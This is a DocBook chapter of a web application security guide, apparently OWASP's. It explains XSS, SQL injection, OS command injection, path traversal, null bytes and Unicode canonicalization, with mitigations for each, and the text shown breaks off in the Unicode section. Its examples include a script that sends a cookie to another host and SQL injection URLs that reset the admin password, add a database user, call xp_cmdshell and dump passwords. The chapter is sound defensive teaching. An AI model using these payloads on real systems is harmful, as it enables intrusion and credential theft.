<!-- $Id: ch11.xml,v 1.15 2003/01/28 07:10:52 gene_mckenna Exp $ -->
<chapter label="11">
   <chapterinfo>
     <authorgroup>
       <author><firstname>Gene</firstname><surname>McKenna</surname>
       </author>
     </authorgroup>
   </chapterinfo>
<title>
Preventing Common Problems
</title>
<sect1>
	<title>
	The Generic Meta-Characters Problem
	</title>
	<para>
	Meta characters are non-printable and printable characters, which affect
	the behavior of programming language commands, operating system
	commands, individual program procedures and database queries.
	Meta-Characters can be encoded in non-obvious ways, so canonicalization
	of data (conversion to a common character set) before stripping
	meta-characters is essential.
	</para>
	<para>
	Example meta-characters and typical uses can be found below. 
	</para>

	<simplelist>
		<member>
		[ ; ] Semicolons for additional command-execution
		</member>
		<member>
		[ | ] Pipes for command-execution
		</member>
		<member>
		[ ! ] Call signs for command-execution
		</member>
		<member>
		[ &amp; ] Used for command-execution
		</member>
		<member>
		[ x20 ] Spaces for faking urls and other names (especial in URLs!)
		</member>
		<member>
		[ x00 ] Nullbytes for truncating strings and filenames
		</member>
		<member>
		[ x04 ] EOT for faking file ends
		</member>
		<member>
		[ x0a ] New lines for additional command-execution
		</member>
		<member>
		[ x0d ] New lines for additional command-execution
		</member>
		<member>
		[ x1b ] Escape
		</member>
		<member>
		[ x08 ] Backspace 
		</member>
		<member>
		[ x7f ] Delete
		</member>
		<member>
		[ ~ ] Tildes
		</member>
		<member>
		[ ' " ] Quotation marks (often in combination with database-queries)
		</member>
		<member>
		[ - ] in combination with database-queries and creation of negative numbers
		</member>
		<member>
		[ *% ] used in combination with database-queries
		</member>
		<member>
		[ ` ] Backticks for command execution
		</member>
		<member>
		[ /\ ] Slashes and Backslashes for faking paths and queries
		</member>
		<member>
		[ &lt;&gt; ] LTs and GTs for file-operations
		</member>
		<member>
		[ &lt;&gt; ] for creating script-language related TAGS within documents on webservers!
		</member>
		<member>
		[ ? ] Programming/scripting- language related
		</member>
		<member>
		[ $ ] Programming/scripting- language related
		</member>
		<member>
		[ @ ] Programming/scripting- language related
		</member>
		<member>
		[ : ] Programming/scripting- language related
		</member>
		<member>
		[ ({[]}) ] Programming/scripting/regex and language-related 
		</member>
		<member>
		[../] two dots and a slash or backslash - for faking filesystem paths
		</member>
	</simplelist>
	<para>
	There are very few reasons why these characters should form legitimate
	input to web applications. The following sections describe in more
	detail some of the ways in which they are used to mount attacks on both
	systems and users.
	</para>
</sect1>
<sect1>
	<title>
	Attacks on The Users
	</title>
	<sect2>
		<title>
		Embedding Malicious HTML Tags
		</title>
		<sect3>
			<title>
			Description
			</title>

			<para>
			Embedding Malicious HTML Tags, sometimes referred to as
			Cross-site scripting, has received a great deal
			of press attention. The name originated from
			the CERT advisory, <ulink
			url="http://www.cert.org/advisories/CA-2000-02.html">CERT
			Advisory CA-2000-02 Malicious HTML Tags
			Embedded in Client Web Requests</ulink>. This attack 
			relies on the fact that users can input data on a web
			site, either through a form or by appending data on a URL,
			and the data is later displayed and rendered by another
			user's browser.
			</para>

			<para>
			A simple example of embedding malicious HTML
			tags happens in a message board application
			where one user can post a message with
			embedded tags that will execute in the
			browsers of all other users who view the
			message board.
			</para>

			<para>
			The attack is always on the system users and not
			the system itself. Of course if the user is an
			administrator of the system that scenario can
			change. To explain the attack lets follow an
			example. In this example, the attack may be instigated
			outside of the application being attacked. In this
			sense, it is considered a Cross-Site Scripting Attack.
			</para>

			<mediaobject>
				<imageobject>
					<imagedata fileref="images/xss_attack.png" format="PNG"/>
				</imageobject>
				<textobject>
					<phrase>A example XSS attack.</phrase>
				</textobject>
			</mediaobject>

			<para>
			The victim is tricked into making a specific and
			carefully crafted HTTP request. There are several ways
			this can happen but the normal way is via a link in an
			HTML aware email, a web based bulletin board or embedded
			in a malicious web page. The victim may not know he is
			making a request if the link is embedded into a
			malicious web page for example and may not require user
			intervention. The attacker has previously discovered an
			application that doesn't filter input and will return to
			the user the requested page and the malicious code he
			added to the request. This forms his request. When the
			web server receives the page request it sends the page
			and the piece of code that was requested. When the user's
			browser receives the new page, the malicious script is
			parsed and executed in the security context of the user.
			So why is this such a problem?
			</para>
			<para>
			Modern client-side scripting languages now run beyond
			simple page formatting and are very powerful. Many
			clients are poorly written and rarely patched. These
			clients may be tricked into executing a number of
			functions that can be dangerous. If the attacker chose a
			web application that the user is authenticated to, the
			script (which acts in the security context of the user)
			can now perform functions on behalf of the user.
			</para>
			<para>
			The classic example often used to demonstrate the
			concept is where a user is logged into a web
			application. The attacker believes the victim is logged
			into the web application and has a valid session stored
			in a session cookie. He constructs a link to the
			application to an area of the application that doesn't
			check user input for validity. It essentially processes
			what the user (victim) requests and returns it.
			</para>
			<para>
			If a legitimate input to the application were via a form
			it may translate to an HTTP request that would look like
			this:
			</para>
			<programlisting>
http://www.owasp.org/test.cgi?userid=owasp
			</programlisting>
			<para>
			The poorly written application may return the variable
			"owasp" in the page as a user friendly name for
			instance. The simple attack URL may look like:
			</para>
			<programlisting>
http://www.owasp.org/test.cgi?userid=owasp&lt;script&gt;alert(document.cookie)&lt;/script&gt;
			</programlisting>
			<para>
			This example would create a browser pop-up with the
			users cookie for that site in the window. The payload
			here is innocuous. A real attacker would create a
			payload that would send the cookie to another location,
			maybe by using syntax like:
			</para>
			<programlisting>
&lt;script&gt;document.write('&lt;img src="http://targetsite.com'+document.cookie+'")&lt;/script&gt;
			</programlisting>
			<para>
			There are a number of ways for the payload to be
			executed. Examples are:
			</para>
			<programlisting>
&lt;img src = "malicious.js"&gt;
&lt;script&gt;alert('hi')&lt;/script&gt;
&lt;iframe = "malicious.js"&gt;
			</programlisting>
			<para>
			Another interesting scenario is especially disconcerting
			for Java developers. As you can see below, the attack relies on
			the concept of returning specific input that was
			submitted back to the user without altering it; i.e. the
			malicious script.  If a Java application such as a
			servlet doesn't handle errors gracefully and allows
			stack traces to be sent to the users browser an attacker
			can construct a URL that will throw an exception and add
			his malicious script to the end of the request. An
			example may be:
			</para>
			<programlisting>
http://www.victim.com/test?arandomurlthatwillthrowanexception&lt;script&gt;alert('hi')&lt;/script&gt;
			</programlisting>
			<para>
			As can be seen there are many ways in which embedding malicious
			HTML tags can be used. Web sites can embed links as
			images that are automatically loaded when the page is
			requested. Web mail may automatically execute when the
			mail is opened, or users could be tricked into clicking
			seemingly innocuous links.
			</para>
		</sect3>
		<sect3>
			<title>
			Mitigation Techniques
			</title>
			<para>
			Preventing the embedding of malicious tags is a challenging task
			especially for large distributed web applications.
			Architecturally if all requests come in to a central
			location and leave from a central location then the
			problem is easier to solve with a common component.
			Code samples of simple components are given in Appendix
			B - Source Code Samples.
			</para>
			<para>
			If your input validation strategy is as we recommend,
			that is to say only accept expected input, then the
			problem is significantly reduced (if you do not need to
			accept HTML as input). We cannot stress that this is the
			correct strategy enough! 
			</para>
			<para>
			Input validation for other purposes, such as SQL Injection
			mitigation is best considered as a separate, and secondary
			input cleaning process. More about SQL Inject Attacks
			follows below.
			</para>
			<para>
			If the web server does not specify which character
			encoding is in use, the client cannot tell which
			characters are special. Web pages with unspecified
			character-encoding work most of the time because most
			character sets assign the same characters to byte values
			below 128. Determining which characters above 128 are
			considered special is somewhat difficult.
			</para>
			<para>
			Some 16-bit character-encoding schemes have additional
			multi-byte representations for special characters such
			as "&lt;". Browsers recognize this alternative encoding and
			act on it. While this is the defined behavior, it makes
			attacks much more difficult to avoid.
			</para>
			<para>
			Web servers should set the character set, then make sure
			that the data they insert is free from byte sequences
			that are special in the specified encoding. This can
			typically be done by settings in the application server
			or web server. The server should define the character
			set in each html page as below. 
			</para>
			<programlisting>
&lt;meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" /&gt;
			</programlisting>
			<para>
			The above tells the browser what character set
			should be used to properly display the
			page. In addition, most servers must also be
			configured to tell the browser what character
			set to use when submitting form data back to
			the server and what character set the server
			application should use internally. The configuration
			of each server for character set control is 
			different, but is very important in understanding
			the canonicalization of input data. Control over
			this process also helps markedly with internationalization
			efforts.
			</para>
			<para>
			Filtering special meta characters is also important.
			HTML defines certain characters as "special", if they
			have an effect on page formatting.
			</para>
			<para>
			In an HTML body:
			</para>
			<itemizedlist mark="opencircle" spacing="compact">
				<listitem>
					<para>
					"&lt;" introduces a tag. 
					</para>
				</listitem>
				<listitem>
					<para>
					"&amp;" introduces a character entity. 
					</para>
				</listitem>
			</itemizedlist>
			<para>
			<emphasis role="italic">
			Note : Some browsers try to correct poorly formatted
			HTML and treat "&gt;" as if it were "&lt;".
			</emphasis>
			</para>
			<para>
			In attributes:
			</para>
			<itemizedlist mark="opencircle" spacing="compact">
				<listitem>
					<para>
					double quotes mark the end of the attribute value. 
					</para>
				</listitem>
				<listitem>
					<para>
					single quotes mark the end of the attribute value. 
					</para>
				</listitem>
				<listitem>
					<para>
					"&amp;" introduces a character entity. 
					</para>
				</listitem>
			</itemizedlist>
			<para>
			In URLs:
			</para>
			<itemizedlist mark="opencircle" spacing="compact">
				<listitem>
					<para>
					Space, tab, and new line denote the end of the URL. 
					</para>
				</listitem>
				<listitem>
					<para>
					"&amp;" denotes a character entity or
					separates query string parameters.
					</para>
				</listitem>
				<listitem>
					<para>
					Non-ASCII characters (that is,
					everything above 128 in the ISO-8859-1
					encoding) are not allowed in URLs.
					</para>
				</listitem>
				<listitem>
					<para>
					The "%" must be filtered from input
					anywhere parameters encoded with HTTP
					escape sequences are decoded by
					server-side code.
					</para>
				</listitem>
			</itemizedlist>
			<para>
			Ensuring correct encoding of dynamic output can prevent
			malicious scripts from being passed to the user. While
			this is no guarantee of prevention, it can help contain
			the problem in certain circumstances. The application
			can make a explicit decision to encode untrusted data
			and leave trusted data untouched, thus preserving
			mark-up content.
			</para>
		</sect3>
		<sect3>
			<title>
			Further Reading
			</title>
			<para>
			See Appendix B - Source Code Samples for a simple way to validate input in J2EE and Perl CGI applications.
			</para>
			<para>
			http://www.cert.org/tech_tips/malicious_code_mitigation.html
			</para>
		</sect3>
	</sect2>
</sect1>
<sect1>
	<title>
	Attacks on the System
	</title>
	<sect2>
		<title>
		Direct SQL Commands
		</title>
		<sect3>
			<title>
			Description
			</title>
			<para>
			Well-designed applications insulate the users from
			business logic. Some applications however do not
			validate user input and allow malicious users to make
			direct database calls to the database. This attack,
			called direct SQL injection, is surprisingly simple.
			</para>
			<para>
			Imagine a web application that has some functionality
			that allows you to change your password. Most do. You
			login and navigate to the account options page, select
			change password, enter your old password and specify the
			new password; twice for security of course. To the user
			it's a transparent process but behind the scenes some
			magic is taking place. When the user enters his old
			password and two new passwords in the web form, his
			browser is creating an http request to the web
			application and sending the data. This should be done
			over SSL to protect the data in transit.
			</para>
			<para>
			That typical request actually may look like this (A
			GET request is used here for simplicity. In practice
			this should be done using a POST):
			</para>
			<programlisting>
http://www.victim.com/changepwd?pwd=Catch22&amp;newpwd=Smokin99&amp;newconfirmpwd=Smokin99&amp;uid=testuser
			</programlisting>
			<para>
			The application that receives this request takes the
			four sets of parameters supplied as input:
			</para>
			<programlisting>
Pwd=Catch22
Newpwd=Smokin99
Newconfirmpwd=Smokin99
Uid=testuser
			</programlisting>
			<para>
			It checks to make sure the two new passwords match out
			of courtesy to the user, discards the duplicate data and
			builds a database query that will check the original
			password and replace it with the new one entered. That
			database query may look like this:
			</para>
			<programlisting>
UPDATE usertable SET pwd='$INPUT[pwd]' WHERE uid='$INPUT[uid]';
			</programlisting>
			<para>
			All works just fine until the attacker comes
			along and figures out he can add another database
			function to the request that actually gets processed and
			executed. Here he adds a function that simply replaces
			the password of any accounts named admin with his chosen
			password. For instance:
			</para>
			<programlisting>
http://www.victim.com/changepwd?pwd=Catch22&amp;newpwd=Smokin99&amp;newconfirmpwd=Smokin99&amp;uid=testuser '+or+uid+like'%25admin%25';--%00
			</programlisting>
			<para>
			The consequences are devastating. The attacker has been
			able to reset the administrative password to one he
			chose, locking out the legitimate systems owners and
			allowing him unlimited access. A badly designed web
			application means hackers are able to retrieve and place
			data in authoritative systems of record at will.
			</para>
			<para>
			The example above uses a technique of appending an
			additional database query to the legitimate data
			supplied. Direct SQL Injection can be use to:
			</para>
			<itemizedlist mark="opencircle" spacing="compact">
				<listitem>
					<para>
					change SQL values 
					</para>
				</listitem>
				<listitem>
					<para>
					concatenate SQL statements 
					</para>
				</listitem>
				<listitem>
					<para>
					add function calls and stored-procedures
					to a statement
					</para>
				</listitem>
				<listitem>
					<para>
					typecast and concatenate retrieved data 
					</para>
				</listitem>
			</itemizedlist>
			<para>
			Some examples are shown below to demonstrate these techniques.  
			</para>
			<sect4>
				<title>
				Changing SQL Values
				</title>
				<programlisting>
UPDATE usertable SET pwd='$INPUT[pwd]' WHERE uid='$INPUT[uid]';
				</programlisting>
				<para>
				Malicious HTTP request
				</para>
				<programlisting>
http://www.none.to/script?pwd=ngomo&amp;uid=1'+or+uid+like'%25admin%25';--%00 
				</programlisting>
			</sect4>
			<sect4>
				<title>
				Concatenating SQL Statements
				</title>
				<programlisting>
SELECT id,name FROM products WHERE id LIKE '%$INPUT[prod]%';
				</programlisting>
				<para>
				Malicious HTTP request
				</para>
				<programlisting>
http://www.none.to/script?0';insert+into+pg_shadow+usename+values+('hoschi')
				</programlisting>
			</sect4>
			<sect4>
				<title>
				Adding function calls and stored-procedures to a statement 
				</title>
				<programlisting>
SELECT id,name FROM products WHERE id LIKE '%$INPUT[prod]%';
				</programlisting>
				<para>
				Malicious HTTP request
				</para>
				<programlisting>
http://www.none.to/script?0';EXEC+master..xp_cmdshell(cmd.exe+/c)
				</programlisting>
			</sect4>
			<sect4>
				<title>
				Typecast and concatenate retrieved data 
				</title>
				<programlisting>
SELECT id,t_nr,x_nr,i_name,last_update,size FROM p_table WHERE size = '$INPUT[size]';
				</programlisting>
				<para>
				Malicious HTTP request
				</para>
				<programlisting>
http://www.none.to/script?size=0'+union+select+'1','1','1',concat(uname||'-'||passwd)+as+i_name+'1'+'1'+from+usertable+where+uname+like+'25 
				</programlisting>
			</sect4>
		</sect3>
		<sect3>
			<title>
			Mitigation Techniques
			</title>
			<para>

			Preventing SQL injection is a very simple task
			if the queries are coded correctly from the
			beginning. The correct strategy is to use a
			parameterized prepared statement for each
			query. In most implementations the database
			driver will take care of properly escaping the
			input so the form of the query can not be
			altered by malicious input characters.

			</para>
			<para>

			Protecting an existing system that has queries
			built through other means could be very
			challenging.  One option would be to rewrite
			the queries using prepared statements. In
			addition to security benefits, prepared
			statements have other advantages as
			well. Because they can be reused with
			different parameters, they can execute faster
			in most databases.

			</para>
			<para>
			
			Alternately, one could attempt to filter the user input
			before it is passed on to a function that will make a 
			database query from it. Similar to creating a user input
			validation process for protecting against embedding of
			malicious HTML tags, the goal should
			be to create a single reusable component that is called
			before every query. 

			</para>

			<para>

			It is not recommended to make a single
			function to protect against both malicious
			HTML tags and SQL Injection. For one thing,
			each database will have a different set of
			special characters and a different way of
			escaping them, whereas HTML tags are the same
			everywhere. Also, not all user input is
			destined to become part of a database query.
			For example, a user who enters the
			last name "O'Neil" into a form includes the special meta-character
			('). This input must be allowed, since it is a legitimate
			part of a name, but it may need to be escaped if it becomes
			part of a database query. 
			</para>

			<para>
			As stated above, the best way to protect a system against SQL injection
			attacks is to construct all queries with prepared
			statements and/or parameterized stored procedures. A
			prepared statement, or parameterized stored procedure,
			encapsulates variables and should escape special
			characters within them automatically and in a manner
			suited to the target database.
			</para>
			<para>
			Common database API's offer developers two different
			means of writing a SQL query. For example, in JDBC, the
			standard Java API for relational database queries, one
			can write a query either using a PreparedStatement or as
			a simple String. The preferred method from both a
			performance and a security standpoint should be to use
			PreparedStatements. With a PreparedStatement, the
			general query is written using a ? as a placeholder for
			a parameter value. Parameter values are substituted as a
			second step. The substitution should be done by the JDBC
			driver such that the value can only be interpreted as
			the value for the parameter intended and any special
			characters within it should be automatically escaped by
			the driver for the database it targets. Different databases escape
			characters in different ways, so allowing the JDBC driver
			to handle this function also makes the system more portable.
			</para>
			<para>
			If the following query (repeated from the example above)
			is made using a JDBC PreparedStatement, the value
			$INPUT[uid] would only be interpreted as a value for
			uid. This would be true regardless of any quotation
			marks or other special characters used in the input
			string.
			</para>
			<programlisting>
UPDATE usertable SET pwd='$INPUT[pwd]' WHERE uid='$INPUT[uid]';
			</programlisting>
			<para>
			Common database interface layers in other
			languages offer similar protections. The Perl DBI
			module, for example, allows for prepared statements to
			be made in a way very similar to the JDBC
			PreparedStatement. Developers should test the behavior
			of prepared statements in their system early in the
			development cycle.
			</para>

			<para>
			Source code samples of JDBC PreparedStatements and
			Perl DBI prepared statements can be found in Appendix C - SQL 
			Injection Mitigation.
			</para>

			<para>
			Use of prepared statements is not a panecea and other forms
			of data validation or sanitizing may be required. A common
			problem is simply that user input fields may be larger than
			the database fields into which they should be stored. Proper
			server side input data validation is still strongly recommended.
			Defense in depth implies that both techniques should be
			used if possible. Also, some application infrastructures 
			may not offer an analogue to the PreparedStatement. In
			these cases, the following two rules should be followed
			in the input validation step, if possible.
			</para>
			<para>
			SQL queries should be built from data values and never
			other SQL queries or parts thereof.
			</para>
			<para>
			If you must use an "explicitly bad" strategy then the
			application should filter special characters used in SQL
			statements. These include "+", "," "'" (single quote)
			and "=".
			</para>
		</sect3>
		<sect3>
			<title>
			Further Reading
			</title>
			<para>
			Appendix C - SQL Injection Mitigation
			</para>
			<para>
			<ulink
			url="http://www.nextgenss.com/papers/advanced_sql_injection.pdf">
			http://www.nextgenss.com/papers/advanced_sql_injection.pdf 
			</ulink>
			<ulink
			url="http://www.sqlsecurity.com/faq-inj.asp">
			http://www.sqlsecurity.com/faq-inj.asp
			</ulink>
			<ulink
			url="http://www.spidynamics.com/papers/SQLInjectionWhitePaper.pdf">
			http://www.spidynamics.com/papers/SQLInjectionWhitePaper.pdf 
			</ulink>
			<ulink
			url="http://www.nextgenss.com/papers/advanced_sql_injection.pdf">
			http://www.nextgenss.com/papers/advanced_sql_injection.pdf
			</ulink>
			<ulink
			url="http://www.nextgenss.com/papers/more_advanced_sql_injection.pdf">
			http://www.nextgenss.com/papers/more_advanced_sql_injection.pdf
			</ulink>
			</para>
		</sect3>
	</sect2>
	<sect2>
		<title>
		Direct OS Commands
		</title>
		<sect3>
			<title>
			Description
			</title>
			<para>
			Nearly every programming language allows the use of so called
			"system-commands", and many applications make use of this type
			of functionality. System-interfaces in programming and scripting
			languages pass input (commands) to the underlying operating
			system. The operating system executes the given input and
			returns its output to stdout along with various return-codes to
			the application such as successful, not successful etc.
			</para>
			<para>
			System commands can be a very convenient feature, which with
			little effort can be integrated into a web-application. Common
			usage for these commands in web applications are filehandling
			(remove,copy), sending emails and calling operating system tools
			to modify the applications input and output in various ways
			(filters).
			</para>
			<para>
			Depending on the scripting or programming language and the
			operating-system it is possible to:
			</para>
			<itemizedlist mark="opencircle" spacing="compact">
				<listitem>
					<para>
					Alter system commands
					</para>
				</listitem>
				<listitem>
					<para>
					Alter parameters passed to system commands
					</para>
				</listitem>
				<listitem>
					<para>
					Execute additional commands and OS command line tools.
					</para>
				</listitem>
				<listitem>
					<para>
					Execute additional commands within executed command
					</para>
				</listitem>
			</itemizedlist>
			<para>Some common problems to avoid are:
			</para>
			<para>
			PHP
			</para>
			<itemizedlist mark="opencircle" spacing="compact">
				<listitem>
					<para>
					require()
					</para>
				</listitem>
				<listitem>
					<para>
					include()
					</para>
				</listitem>
				<listitem>
					<para>
					eval()
					</para>
				</listitem>
				<listitem>
					<para>
					preg_replace() (with /e modifier)
					</para>
				</listitem>
				<listitem>
					<para>
					exec()
					</para>
				</listitem>
				<listitem>
					<para>
					passthru()
					</para>
				</listitem>
				<listitem>
					<para>
					`` (backticks)
					</para>
				</listitem>
				<listitem>
					<para>
					system()
					</para>
				</listitem>
				<listitem>
					<para>
					popen()
					</para>
				</listitem>
			</itemizedlist>
			<para>
			Shell Scripts
			</para>
			<itemizedlist mark="opencircle" spacing="compact">
				<listitem>
					<para>
					often problematic and dependent on the shell
					</para>
				</listitem>
			</itemizedlist>
			<para>
			Perl
			</para>
			<itemizedlist mark="opencircle" spacing="compact">
				<listitem>
					<para>
					open()
					</para>
				</listitem>
				<listitem>
					<para>
					sysopen()
					</para>
				</listitem>
				<listitem>
					<para>
					glob()
					</para>
				</listitem>
				<listitem>
					<para>
					system()
					</para>
				</listitem>
				<listitem>
					<para>
					'' (backticks)
					</para>
				</listitem>
				<listitem>
					<para>
					eval()
					</para>
				</listitem>
			</itemizedlist>
			<para>
			Java(Servlets, JSP's)
			</para>
			<itemizedlist mark="opencircle" spacing="compact">
				<listitem>
					<para>
					System.* (especially System.Runtime)
					</para>
				</listitem>
			</itemizedlist>
			<para>
			C &amp; C++
			</para>
			<itemizedlist mark="opencircle" spacing="compact">
				<listitem>
					<para>
					system()
					</para>
				</listitem>
				<listitem>
					<para>
					exec**()
					</para>
				</listitem>
				<listitem>
					<para>
					strcpy 
					</para>
				</listitem>
				<listitem>
					<para>
					strcat 
					</para>
				</listitem>
				<listitem>
					<para>
					sprintf 
					</para>
				</listitem>
				<listitem>
					<para>
					vsprintf 
					</para>
				</listitem>
				<listitem>
					<para>
					gets 
					</para>
				</listitem>
				<listitem>
					<para>
					strlen 
					</para>
				</listitem>
				<listitem>
					<para>
					scanf 
					</para>
				</listitem>
				<listitem>
					<para>
					fscanf 
					</para>
				</listitem>
				<listitem>
					<para>
					sscanf 
					</para>
					</listitem>
					<listitem>
					<para>
					vscanf 
					</para>
				</listitem>
				<listitem>
					<para>
					vsscanf 
					</para>
				</listitem>
				<listitem>
					<para>
					vfscanf 
					</para>
				</listitem>
				<listitem>
					<para>
					realpath 
					</para>
				</listitem>
				<listitem>
					<para>
					getopt 
					</para>
				</listitem>
				<listitem>
					<para>
					getpass 
					</para>
				</listitem>
				<listitem>
					<para>
					streadd 
					</para>
				</listitem>
				<listitem>
					<para>
					strecpy 
					</para>
				</listitem>
				<listitem>
					<para>
					strtrns
					</para>
				</listitem>
			</itemizedlist>
		</sect3>
		<sect3>
			<title>
			Mitigation Techniques
			</title>
			<para>
			Preventing direct OS commands is a challenging task
			especially for large distributed web systems consisting
			of several applications. Architecturally if all requests
			come in to a central location and leave from a central
			location then the problem is easier to solve with a
			common component. Validation is most effective when
			placed nearest to the intended entrance and exit points
			of a system, allowing more accurate assessment of the
			threats at every point.
			</para>
			<para>
			If your input validation strategy is as we recommend,
			that is to say only accept expected input then the
			problem is significantly reduced. We cannot stress that
			this is the correct strategy enough!
			</para>
		</sect3>
	</sect2>
	<sect2>
		<title>
		Path Traversal and Path Disclosure
		</title>
		<sect3>
			<title>
			Description
			</title>
			<para>
			Many web applications utilize the file system of the web
			server in a presentation tier to temporarily and/or
			permanently save information. This may include page
			assets like image files, static HTML or applications
			like CGI's. The WWW-ROOT directory is typically the
			virtual root directory within a web server, which is
			accessible to a HTTP Client. Web Applications may store
			data inside and/or outside WWW-ROOT in designated
			locations.
			</para>
			<para>
			If the application does NOT properly check and handle
			meta-characters used to describe paths for example "../"
			it is possible that the application is vulnerable to a
			"Path Trasversal" attack. The  attacker can construct a
			malicious request to return data about physical file
			locations such as /etc/passwd. This is often referred to
			as a "file disclosure" vulnerability. Attackers may also
			use this properties to create specially crafted URL's to
			Path traversal attacks are typically used in conjunction
			with other attacks like direct OS commands or direct SQL
			injection.
			</para>
			<para>
			Scripting languages such as PHP, Perl, SSIs and several
			"template-based-systems" who automatically execute code
			located in required, included or evaluated files.
			</para>
			<para>
			Traversing back to system directories which contain
			binaries makes it possible to execute system commands
			OUTSIDE designated paths instead of opening, including
			or evaluating file.
			</para>
		</sect3>
		<sect3>
			<title>
			Mitigation Technique
			</title>
			<para>
			Where possible make use of path normalization functions
			provided by your development language. Also remove
			offending path strings such as "../" as well as their
			unicode variants from system input. Use of "chrooted"
			servers can also mitigate this issue.
			</para>
			<para>
			Preventing path traversal and path disclosure is a
			challenging task especially for large distributed web
			systems consisting of several applications.
			Architecturally if all requests come in to a central
			location and leave from a central location then the
			problem is easier to solve with a common component.
			</para>
			<para>
			If your input validation strategy is as we recommend,
			that is to say only accept expected input then the
			problem is significantly reduced. We can not stress that
			this is the correct strategy enough!
			</para>
		</sect3>
	</sect2>
	<sect2>
		<title>
		Null Bytes
		</title>
		<sect3>
			<title>
			Description
			</title>
			<para>
			While web applications may be developed in a variety of
			programming languages, these applications often pass
			data to underlying lower level C-functions for further
			processing and functionality.
			</para>
			<para>
			If a given string, lets say "AAA\0BBB" is accepted as a
			valid string by a web application (or specifically the
			programming language), it may be shortened to "AAA" by
			the underlying C-functions. This occurs because C/C++
			perceives the null byte (\0) as the termination of a
			string. Applications which do not perform adequate input
			validation can be fooled by inserting null bytes in
			"critical" parameters. This is normally done by URL
			Encoding the null bytes (%00). In special cases it is
			possible to use Unicode characters.
			</para>
			<para>
			The attack can be used to :
			</para>
			<itemizedlist mark="opencircle" spacing="compact">
				<listitem>
					<para>
					Disclose physical paths, files and OS-information
					</para>
				</listitem>
				<listitem>
					<para>
					Truncate strings
					</para>
				</listitem>
				<listitem>
					<para>
					Paths
					</para>
				</listitem>
				<listitem>
					<para>
					Files
					</para>
				</listitem>
				<listitem>
					<para>
					Commands
					</para>
				</listitem>
				<listitem>
					<para>
					Command parameters
					</para>
				</listitem>
				<listitem>
					<para>
					Bypass validity checks, looking for substrings in parameters
					</para>
				</listitem>
				<listitem>
					<para>
					Cut off strings passed to SQL Queries
					</para>
				</listitem>
			</itemizedlist>
			<para>
			The most popular affected scripting and programming languages are:
			</para>
			<itemizedlist mark="opencircle" spacing="compact">
				<listitem>
					<para>
					Perl (highly)
					</para>
				</listitem>
				<listitem>
					<para>
					Java (File, RandomAccessFile and similar Java-Classes)
					</para>
				</listitem>
				<listitem>
					<para>
					PHP (depending on its configuration)
					</para>
				</listitem>
			</itemizedlist>
		</sect3>
		<sect3>
			<title>
			Mitigation Technique
			</title>
			<para>
			Preventing null byte attacks requires that all input be
			validated before the application acts upon it.
			</para>
		</sect3>
	</sect2>
	<sect2>
		<title>
		Canonicalization
		</title>
		<para>
		Just when you figured out and understood the most common
		attacks, canonicalization steps them all up a few gears!
		</para>
		<para>
		Canonicalization deals with the way in which systems convert
		data from one form to another. Canonical means the simplest or
		most standard form of something. Canonicalization is the process
		of converting something from one representation to the simplest
		form. Web applications have to deal with lots of
		canonicalization issues from URL encoding to IP address
		translation. When security decisions are made based on canonical
		forms of data, it is therefore essential that the application is
		able to deal with canonicalization issues accurately.
		</para>
		<sect3>
			<title>
			Unicode
			</title>
			<para>
			As an example, one may look at the Unicode character
			set. Unicode is the internal format of  the Java
			language. Unicode Encoding is a method for storing
			characters with multiple bytes. Wherever input data is
			allowed, data can be entered using Unicode to disguise
			malicious code and permit a variety of attacks. RFC 2279
			references many ways that text can be encoded.
			</para>
			<para>
			Unicode was developed to allow a Universal Character Set
			(UCS) that encompasses most of the world's writing
			systems. Multi-octet characters, however, are not
			compatible with many current applications and protocols,
			and this has led to the development of a few UCS
			transformation formats (UTF) with varying
			characteristics. UTF-8 has the characteristic of
			preserving the full US-ASCII range. It is compatible
			with file systems, parsers and other software relying on
			US-ASCII values, but it is transparent to other values.
			</para>
			<para>
			In a Unicode Encoding attack, there are several unique
			issues at work. The variety of issues increases the
			complexity. The first issue involves Character Mapping
			while the second issue involves Character Encoding. An
			additional issue is related to whether the application
			supports Character Mapping and how that application
			encodes and decodes that mapping.
			</para>
			<table frame='all'>
				<title></title>
				<tgroup cols='2' align='left' colsep='1' rowsep='1'>
					<colspec colname='c1'/>
					<colspec colname='c2'/>
					<thead>
						<row>
							<entry align="center">
							UCS-4 Range
							</entry>
							<entry align="center">
							UTF-8 encoding
							</entry>
						</row>
					</thead>
					<tbody>
						<row>
							<entry>
							0x00000000-0x0000007F
							</entry>
							<entry>
							0xxxxxxx
							</entry>
						</row>
						<row>
							<entry>
							0x00000080 - 0x000007FF
							</entry>
							<entry>
							110xxxxx 10xxxxxx
							</entry>
						</row>
						<row>
							<entry>
							0x00000800-0x0000FFFF
							</entry>
							<entry>
							1110xxxx 10xxxxxx 10xxxxxx
							</entry>
						</row>
						<row>
							<entry>
							0x00010000-0x001FFFFF
							</entry>
							<entry>
							11110xxx 10xxxxxx 10xxxxxx 10xxxxxx
							</entry>
						</row>
						<row>
							<entry>
							0x00200000-0x03FFFFFF
							</entry>
							<entry>
							111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx
							</entry>
						</row>
						<row>
							<entry>
							0x04000000-0x7FFFFFFF
							</entry>
							<entry>
							1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx
							</entry>
						</row>
					</tbody>
				</tgroup>
			</table>
			<para>
			It is thus possible to form illegal UTF-8 encodings, in
			two senses:
			</para>
			<itemizedlist mark="opencircle" spacing="compact">
				<listitem>
					<para>
					A UTF-8 sequence for a given symbol may
					be longer than necessary for
					representing the symbol.
					</para>
				</listitem>
				<listitem>
					<para>
					A UTF-8 sequence may contain octets that
					are in incorrect format (i.e. do not
					comply with the above 6 formats).
					</para>
				</listitem>
			</itemizedlist>
			<para>
			The importance of UTF-8 representation stems from the
			fact that web-servers/applications perform several steps
			on their input of this format. The order of the steps is
			sometimes critical to the security of the application.
			Basically, the steps are "URL decoding" potentially
			followed by "UTF-8 decoding", and intermingled with them
			are various security checks, which are also processing
			steps. If, for example, one of the security checks is
			searching for "..", and it is carried out before UTF-8
			decoding takes place, it is possible to inject ".." in
			their overlong UTF-8 format. Even if the security checks
			recognize some of the non-canonical format for dots, it
			may still be that not all formats are known to it.
			Examples: Consider the ASCII character "." (dot). Its
			canonical representation is a dot (ASCII 2E). Yet if we
			think of it as a character in the second UTF-8 range (2
			bytes), we get an overlong representation of it, as C0
			AE. Likewise, there are more overlong representations:
			E0 80 AE, F0 80 80 AE, F8 80 80 80 AE and FC 80 80 80 80
			AE.
			</para>
			<para>
